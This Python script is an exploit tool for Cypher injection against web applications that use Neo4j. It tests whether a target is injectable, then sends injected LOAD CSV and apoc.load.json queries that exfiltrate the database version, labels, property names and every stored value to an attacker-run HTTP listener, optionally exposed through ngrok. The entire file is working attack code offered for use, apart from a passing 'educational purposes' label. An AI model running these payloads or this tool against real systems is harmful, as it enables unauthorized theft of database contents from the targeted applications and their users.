#!/usr/bin/python3
import argparse
import requests
import urllib.parse
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import netifaces as ni
import queue
import re
import sys
import json
import os
from tabulate import tabulate
from pyngrok import ngrok
from packaging import version


data_queue = queue.Queue()

# Helper functions
def get_ip_address(network_interface):
    """Retrieve the IP address for a given network interface."""
    return ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']

def extract_query_params(query_string):
    """
    Extracts param=value into json format
    """
    pattern = re.compile(r'([^&=?]+)=([^&=?]+)')
    matches = pattern.findall(query_string)
    return {key: value for key, value in matches}

def merge_dicts(list_of_dicts):
    """Merge a list of dictionaries into a single dictionary."""
    merged_dict = {}
    for single_dict in list_of_dicts:
        merged_dict.update(single_dict)
    return merged_dict

def convert_to_json(data):
    """Convert data structure into a JSON string."""
    result_dict = {str(index+1): merge_dicts(item) for index, item in enumerate(data)}
    return json.dumps(result_dict, indent=2)

def write_json_to_file(json_data, filename="output.json"):
    """Write JSON data to a file."""
    output_dir = os.path.join(os.getcwd(), "output")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    file_path = os.path.join(output_dir, filename)
    with open(file_path, 'w') as file:
        file.write(json_data)

def json_to_table(json_data):
    """
    Convert JSON data into a nicely formatted table and print it.

    Args:
    - json_data: A JSON string representing the structured data.
    """
    # Convert the JSON string back into a Python dictionary
    data_dict = json.loads(json_data)

    # Prepare data for the tabulate library
    # Assuming the JSON structure is a dictionary of dictionaries
    headers = []
    table_data = []
    for key, value in data_dict.items():
        if not headers:
            headers = ["ID"] + list(value.keys())
        row = [key] + list(value.values())
        table_data.append(row)

    # Generate and print the table
    print(tabulate(table_data, headers=headers, tablefmt="grid"))


def convert_properties_to_json(properties_dict):
    # Decode URIs and split values into lists
    lists = {k: urllib.parse.unquote(v).split(',') for k, v in properties_dict.items()}

    # Determine the maximum list length to ensure all lists have equal length
    max_length = max(len(lst) for lst in lists.values())

    # Extend shorter lists with None to match the maximum length
    for key, lst in lists.items():
        lists[key] = lst + [None] * (max_length - len(lst))

    # Zip the lists together and create a structured list of dictionaries
    zipped = zip(*lists.values())
    values = [[{k: v} for k, v in zip(lists.keys(), values)] for values in zipped]
    json_result = convert_to_json(values)
    return json_result


# Classes
class RequestHandler(BaseHTTPRequestHandler):
    """Handles HTTP GET requests."""
    def do_GET(self):
        data_queue.put(self.path)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    def log_message(self, format, *args):
        return

class Listener():
    """A simple HTTP server listening for data."""
    def __init__(self, port):
        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)

    def start_listener(self):
        self.server.serve_forever()

    def stop_listener(self):
        self.server.shutdown()

class Neo4jInjector:
    """Handles the injection of payloads into a Neo4j database."""
    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
        self.target = target
        self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
        self.request_type = request_type
        self.parameters = parameters
        self.cookie = cookie if cookie else ""
        self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
        self.proxies = {'http': 'http://127.0.0.1:8080'}

    def inject_payload(self, payload):
        """Inject a crafted payload to the target."""
        for injection_character in ["-1", "'", "\""]:
            full_payload = f"{injection_character}{payload}"
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            self.execute_request(url, data)

    def prepare_request_data(self, encoded_payload):
        """Prepare the URL and data for the request."""
        if self.request_type == "API":
            url = f"{self.target}{self.parameters}{encoded_payload}"
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        """Execute the HTTP request with the prepared data."""
        try:
            response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
            if response.status_code == 302:
                print("302 Redirect, Cookies Expired/Invalid ?")
                sys.exit()
            elif response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                return response
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

        return None

    def detect_inject(self):
        print("Determining if the target is injectable")
        injection_characters = ["'", "\"", "-1"]
        working_char = ""
        or_case = None
        and_case = None
        for injection_character in injection_characters:
            if (injection_character == "-1"):
                payload = f" OR 1=1"
            else:
                payload = f" OR 1=1 OR 'g' = {injection_character}g"
            full_payload = f"{injection_character}{payload}"
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            response = self.execute_request(url, data)
            if (response):
                working_char = injection_character
                or_case = response
                break

        if (working_char == "-1"):
            full_payload = f"{working_char} AND 1=1 AND 1=0"
        else:
            full_payload = f"{working_char} AND 1=1 AND 1=0 AND 'g' = {working_char}g"
        encoded_payload = urllib.parse.quote(full_payload, safe='')
        url, data = self.prepare_request_data(encoded_payload)
        and_case = self.execute_request(url, data)
        
        return (and_case and and_case.headers["Content-Length"] != or_case.headers["Content-Length"])

    def exfil_data(self):

        print("\n[*] Version Check [*]")
        self.inject_payload(f" OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 0 as _0//")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        
        nested_dict = {'-': parsed_data}
        json_result = json.dumps(nested_dict)
        write_json_to_file(json_result, "version.json")
        json_to_table(json_result)


        print("\n[*] APOC Check [*]")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL apoc.load.json('{self.exfil_ip}/?apoc_installed=True') YIELD value RETURN value//")
        apoc_installed = True
        if data_queue.empty():
            parsed_data = {'apoc_installed': 'False'}
            nested_dict = {'-': parsed_data}
            apoc_installed = False
        else:
            data = data_queue.get()  # Retrieve the next item from the queue
            parsed_data = extract_query_params(data)  # Use the previously defined function
        
    

        nested_dict = {'-': parsed_data}
        json_result = json.dumps(nested_dict)
        write_json_to_file(json_result, "apoc_installed.json")
        json_to_table(json_result)

        if apoc_installed:
            return True

        # version = parsed_data.get("version")
        # if version.parse(given_version) >= version.parse("5.0"):
        #     print(f"Version {given_version} is greater than or equal to 5.0")
        # else:
        #     print(f"Version {given_version} is less than 5.0")
        # dump label count
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 //")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        label_count = parsed_data.get('label_count')  # Extract the label value
        
        
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM '{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")

        # Store labels
        labels = []
        for _ in range(int(label_count)):
            data = data_queue.get()  # Retrieve the next item from the queue
            parsed_data = extract_query_params(data)  # Use the previously defined function
            label_value = parsed_data.get('label')  # Extract the label value
            labels.append(label_value)

        print(f"\navailable labels [{label_count}]:")
        for label in labels:
            print(f"[*] {label}")


        label = input(f"\nEnter label to dump: ")

        # Dump property count
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?property_count=' + y as l RETURN 0 as _0 //")


        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        property_count = parsed_data.get('property_count')  # Extract the label value


        # print("Dumping Properties")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties WITH REDUCE(mergedString = '', value in all_properties | mergedString+value+',') as joinedString  LOAD CSV FROM '{self.exfil_ip}/?keys='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")

        data = data_queue.get()
        parsed_data = extract_query_params(data[0:-1])
        print(f"\navailable properties [{property_count}]:")
        properties = parsed_data['keys'].split(',')
        for pr0perty in properties:
            print(f"[*] {pr0perty}")


        properties_dict = {}
        for pr0perty in properties:
            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH COLLECT(DISTINCT(x.{pr0perty})) AS {pr0perty}  WITH REDUCE(mergedString = '', value in {pr0perty} | mergedString+value+',') as  joinedString LOAD CSV FROM '{self.exfil_ip}/?{pr0perty}='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")
            data = data_queue.get()
            parsed_data = extract_query_params(data[0:-1])
            properties_dict.update(parsed_data)

        json_result = convert_properties_to_json(properties_dict)
        print(f"\nLabel: {label}")
        print(f"[{property_count} columns]")
        json_to_table(json_result)

    def apoc_exfil_data(self):
        print("\n[*] Using APOC to Exfiltrate [*]")

        # dump label count
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l CALL apoc.load.json('{self.exfil_ip}/?label_count='+l) YIELD value RETURN value//")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        label_count = parsed_data.get('label_count')  # Extract the label value

            
        # dump labels    
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() YIELD label WITH DISTINCT label WITH COLLECT(label) as all_label CALL apoc.load.json('{self.exfil_ip}/?labels='+apoc.text.join(all_label, ',')) YIELD value RETURN value//")

        # Store labels
        data = data_queue.get()
        parsed_data = extract_query_params(data)
        print(f"\navailable labels [{label_count}]:")
        labels = parsed_data['labels'].split(',')
        for label in labels:
            print(f"[*] {label}")


        label = input(f"\nEnter label to dump: ")


        # dump property count
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y CALL apoc.load.json('{self.exfil_ip}/?property_count=' + y) YIELD value RETURN value//")


        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        property_count = parsed_data.get('property_count')  # Extract the label value

        

        # print("Dumping Properties")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties CALL apoc.load.json('{self.exfil_ip}/?keys=' + apoc.text.join(all_properties,',')) YIELD value RETURN value//")

        data = data_queue.get()
        parsed_data = extract_query_params(data)
        print(f"\navailable properties [{property_count}]:")
        properties = parsed_data['keys'].split(',')
        for pr0perty in properties:
            print(f"[*] {pr0perty}")


        properties_dict = {}
        for pr0perty in properties:
            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH COLLECT(DISTINCT(x.{pr0perty})) AS {pr0perty} CALL apoc.load.json('{self.exfil_ip}/?{pr0perty}=' + apoc.text.join({pr0perty}, ',')) YIELD value RETURN value//")
            data = data_queue.get()
            parsed_data = extract_query_params(data)
            properties_dict.update(parsed_data)

        json_result = convert_properties_to_json(properties_dict)
        print(f"\nLabel: {label}")
        print(f"[{property_count} columns]")
        json_to_table(json_result)       



def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameters", default="", help="Vulnerable parameters")
    parser.add_argument("-c", "--cookie", help="Optional cookie in format key=value")
    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type")
    parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
    parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
    args = parser.parse_args()

    listener = Listener(args.listen_port)
    listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
    listener_thread.start() 

    if args.int == "public":
        ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
        if ngrok_auth_token:
            ngrok.set_auth_token(ngrok_auth_token)
        else:
            print("Ngrok auth token not set. Please set the NGROK_AUTH_TOKEN environment variable.")
            sys.exit(1)
        start_ngrok = ngrok.connect(args.listen_port, "tcp")
        url = start_ngrok.public_url.replace("tcp://", "http://")
        hostname, port = url.split("://")[1].split(":")
        args.exfil_ip = f"http://{hostname}"
        args.listen_port = int(port)
        
        print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")
    elif args.int:
        args.exfil_ip = f"http://{get_ip_address(args.int)}"
    else:
        args.exfil_ip = "127.0.0.1"


    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)

    if (args.type == "API"):
        if (injector.detect_inject()):
            print("Target likely injectable, continuing")
        else:
            if (input("Target likely not injectable, continue? (y/n default: n)").lower() != "y"):
                return
    else:
        print("This version of the program only supports injection detection of API methods")

    # Begin exfiltration process
    apoc_installed = injector.exfil_data()
    if apoc_installed:
        injector.apoc_exfil_data()


    listener.stop_listener()
    listener_thread.join()

    if args.int == "public":
        ngrok.disconnect(start_ngrok.public_url)

if __name__ == "__main__":
    main()